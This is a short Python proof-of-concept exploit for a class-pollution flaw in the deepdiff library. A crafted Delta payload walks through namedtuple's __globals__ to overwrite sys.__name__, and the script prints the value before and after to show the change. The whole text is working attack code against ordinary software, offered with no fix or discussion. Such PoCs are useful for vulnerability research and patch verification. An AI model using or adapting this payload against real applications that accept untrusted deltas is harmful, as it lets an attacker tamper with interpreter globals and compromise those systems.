import sys, deepdiff, os
from collections import namedtuple

# payload
payload = {
  "attribute_added" : {
    "root['x']": namedtuple,
    "root['x'].'__globals__'['_sys'].'__name__'": "polluted",
  }
}

# Before the pollution check
print(f"Before the pollution: sys.__name__ = {getattr(sys, "__name__")}")

# Pollution
delta = deepdiff.Delta(payload)
obj1 = {"a": 1, "b": 2, "c": 3}
obj1 = obj1 + delta

# After the pollution check
print(f"After the pollution: sys.__name__ = {getattr(sys, "__name__")}")